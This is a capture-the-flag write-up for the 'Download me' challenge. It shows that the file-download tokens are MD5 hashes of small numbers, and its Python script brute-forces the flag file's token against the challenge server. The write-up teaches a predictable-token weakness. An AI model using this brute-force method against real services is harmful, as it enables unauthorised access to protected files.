# Download me ...

## Problem

The problem simply links the URL to the webpage,


## Solution

Simply clicking on `flag.txt` results in an `Invalid token.` error. 
Viewing the source code, we can see that the each file has a token associated with it. 

```
download.php?file=file1.txt&token=6f2268bd1d3d3ebaabb04d6b5d099425
download.php?file=file2.txt&token=e6cb2a3c14431b55aa50c06529eaa21b
download.php?file=file3.txt&token=65658fde58ab3c2b6e5132a39fae7cb9
download.php?file=flag.txt&token=
```

The length of each token is 32 characters suggesting it might be an MD5 hash. 
Using [Hashkiller](https://hashkiller.co.uk/Cracker),
```
6f2268bd1d3d3ebaabb04d6b5d099425 MD5 753 or osCommerce 75:3
e6cb2a3c14431b55aa50c06529eaa21b MD5 952 or osCommerce 95:2
65658fde58ab3c2b6e5132a39fae7cb9 MD5 536 or osCommerce 53:6
```

We realize that all the hashes are simply numbers, meaning we can brute force the valid token.

Here is the python script that does that:
```python
import requests
import hashlib

url = 'http://159.89.22.33:25632/download.php?file=flag.txt&token='

for n in range(1000):
	m = hashlib.md5()
	m.update(str(n))
	r = requests.get(url + m.hexdigest())
	if(r.text != 'Invalid token.'):
		print r.text
		break
```

Flag: **AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}**
